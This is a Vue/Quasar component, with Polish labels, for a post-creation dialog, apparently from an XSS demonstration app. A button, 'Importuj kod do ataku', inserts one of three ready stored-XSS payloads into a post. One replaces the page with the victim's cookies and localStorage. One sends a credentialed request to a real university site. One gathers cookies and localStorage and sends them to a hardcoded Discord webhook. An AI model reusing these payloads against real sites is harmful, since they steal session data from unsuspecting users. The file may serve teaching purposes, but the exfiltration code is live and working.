<template>
  <!-- Formularz do dodawania postów -->
  <q-dialog v-model="showModal">
    <q-card style="width: min(600px, 100%)">
      <q-card-section>
        <div class="text-h6">Dodaj nowy post</div>

        <div class="q-pa-md q-gutter-sm">

        <q-input v-model="newPost.title" label="Tytuł" :rules="[val => !!val || 'Tytuł jest wymagany']"  />

        <q-editor
          v-model="newPost.content"
          :dense="$q.screen.lt.md"
          placeholder="Treść posta"
          :toolbar="[
            [
              {
                label: $q.lang.editor.align,
                icon: $q.iconSet.editor.align,
                fixedLabel: true,
                list: 'only-icons',
                options: ['left', 'center', 'right', 'justify']
              },
              {
                label: $q.lang.editor.align,
                icon: $q.iconSet.editor.align,
                fixedLabel: true,
                options: ['left', 'center', 'right', 'justify']
              }
            ],
            ['bold', 'italic', 'strike', 'underline', 'subscript', 'superscript'],
            ['token', 'hr', 'link', 'custom_btn'],
            ['print', 'fullscreen'],
            [
              {
                label: $q.lang.editor.formatting,
                icon: $q.iconSet.editor.formatting,
                list: 'no-icons',
                options: [
                  'p',
                  'h1',
                  'h2',
                  'h3',
                  'h4',
                  'h5',
                  'h6',
                  'code'
                ]
              },
              {
                label: $q.lang.editor.fontSize,
                icon: $q.iconSet.editor.fontSize,
                fixedLabel: true,
                fixedIcon: true,
                list: 'no-icons',
                options: [
                  'size-1',
                  'size-2',
                  'size-3',
                  'size-4',
                  'size-5',
                  'size-6',
                  'size-7'
                ]
              },
              {
                label: $q.lang.editor.defaultFont,
                icon: $q.iconSet.editor.font,
                fixedIcon: true,
                list: 'no-icons',
                options: [
                  'default_font',
                  'arial',
                  'arial_black',
                  'comic_sans',
                  'courier_new',
                  'impact',
                  'lucida_grande',
                  'times_new_roman',
                  'verdana'
                ]
              },
              'removeFormat'
            ],
            ['quote', 'unordered', 'ordered', 'outdent', 'indent'],

            ['undo', 'redo'],
            ['viewsource']
          ]"
          :fonts="{
            arial: 'Arial',
            arial_black: 'Arial Black',
            comic_sans: 'Comic Sans MS',
            courier_new: 'Courier New',
            impact: 'Impact',
            lucida_grande: 'Lucida Grande',
            times_new_roman: 'Times New Roman',
            verdana: 'Verdana'
          }"
        />


        <q-btn label="Importuj kod do ataku ataku">
           <q-menu>
            <q-list style="max-width: 360px;">
              <q-item clickable @click="setNewPostContent1()">
                <q-item-section side>
                  <q-badge>1</q-badge>
                </q-item-section>
                <q-item-section >
                  Zmień widok wszystkich użytkowników strony
                </q-item-section>
              </q-item>

              <q-separator />

              <q-item clickable @click="setNewPostContent2()">
                <q-item-section side>
                  <q-badge>2</q-badge>
                </q-item-section>
                <q-item-section >
                  Wyślij request od wszystkich użytkowników na inną domene
                </q-item-section>
              </q-item>

              <q-separator />

              <q-item clickable @click="setNewPostContent3()">
                <q-item-section side>
                  <q-badge>3</q-badge>
                </q-item-section>
                <q-item-section >
                  Ukradnij ciastka i local storage wszystkich użytkowników i wyślij go na discorda atakującego
                </q-item-section>
              </q-item>
            </q-list>
          </q-menu>
        </q-btn>
       
        </div>
      </q-card-section>

      <q-card-actions align="right">
        <q-btn flat label="Anuluj" color="secondary" @click="showModal = false" />
        <q-btn flat label="Dodaj" color="primary" @click="addPost" />
      </q-card-actions>
    </q-card>
  </q-dialog>
</template>

<script setup lang="ts">
import { Notify } from 'quasar';
import axios from 'axios';
import { ref } from 'vue';
import { api } from 'src/boot/axios';

// Funkcja do dodawania nowego postu
const newPost = ref({ title: '', content: '' });
const showModal = defineModel<boolean>();

const addPost = async () => {
  try {
    await api.post('/posts', {...newPost.value, isNew: true }, {
      withCredentials: true
    });
    newPost.value = { title: '', content: '' }; // Reset formularza
    showModal.value = false;
  } catch (error) {
    Notify.create({
      message: 'Brak tytułu lub treści',
      type: 'negative'
    })
    console.error('Błąd podczas dodawania postu:', error);
  }
};

const setNewPostContent1 = () => {
  newPost.value.title = 'Kliknij na fotke'
  newPost.value.content = '<img src="xd" onclick="var mainElement = document.querySelector(\'main\'); mainElement.remove(); var newMain = document.createElement(\'main\'); var cookies = document.cookie; var localStorageData = \'\'; for (var i = 0; i < localStorage.length; i++) { var key = localStorage.key(i); var value = localStorage.getItem(key); localStorageData += key + \': \' + value + \'<br>\'; } newMain.innerHTML = `<h1>Dzięki za twoje dane ;)</h1><p><strong>Cookies:</strong><br>${cookies}</p><p><strong>Local Storage:</strong><br>${localStorageData}</p>`; document.querySelector(\'.q-page-container\').appendChild(newMain);" />';
}

const setNewPostContent2 = () => {
  newPost.value.title = 'Kliknij na zdjęcie aby request na domene wybraną przez hakera'
  newPost.value.content = '<img src="xd" onclick="(async () => { try { const response = await fetch(\'https://www.sprawozdania.kia.prz.edu.pl/index.php?entry=sa_reports\', { method: \'GET\', credentials: \'include\', mode: \'no-cors\' }); if (!response.ok) { throw new Error(`HTTP error! status: ${response.status}`); } const html = await response.text(); const container = document.querySelector(\'.q-page-container\'); if (container) { container.innerHTML = html; } else { console.error(\'Nie znaleziono elementu .q-page-container\'); } } catch (error) { console.error(\'Błąd:\', error); } })();" />';
}

const setNewPostContent3 = () => {
  newPost.value.title = 'Dzięki za dane ;)'
  newPost.value.content = '<img src="xd" onerror="const webhookUrl = \'https://discord.com/api/webhooks/1333932771269410826/9z92ujGV8SQMAlMSJaymyUKdbXitrv8ozdydq986rP8ntq2_GFaaNP_r_IsjC4xYD2fj\'; const getCookiesList = () => { const cookies = document.cookie.split(\';\'); return cookies.map(cookie => cookie.trim()).join(\'\\n\'); }; const getLocalStorageList = () => { const localStorageData = Object.entries(localStorage); return localStorageData.map(([key, value]) => `${key}: ${value}`).join(\'\\n\'); }; const messageContent = `\\n ------- \\n **Cookies:**\\n${getCookiesList()}\\n\\n**LocalStorage:**\\n${getLocalStorageList()}\\n ------- \\n`; const sendToDiscord = async () => { const body = JSON.stringify({ content: messageContent }); try { const response = await fetch(webhookUrl, { method: \'POST\', headers: { \'Content-Type\': \'application/json\' }, body: body }); if (response.ok) { console.log(\'Wiadomość została wysłana!\'); } else { console.error(\'Wystąpił błąd podczas wysyłania wiadomości:\', response.status); } } catch (error) { console.error(\'Błąd:\', error); } }; sendToDiscord();" />';
}

</script>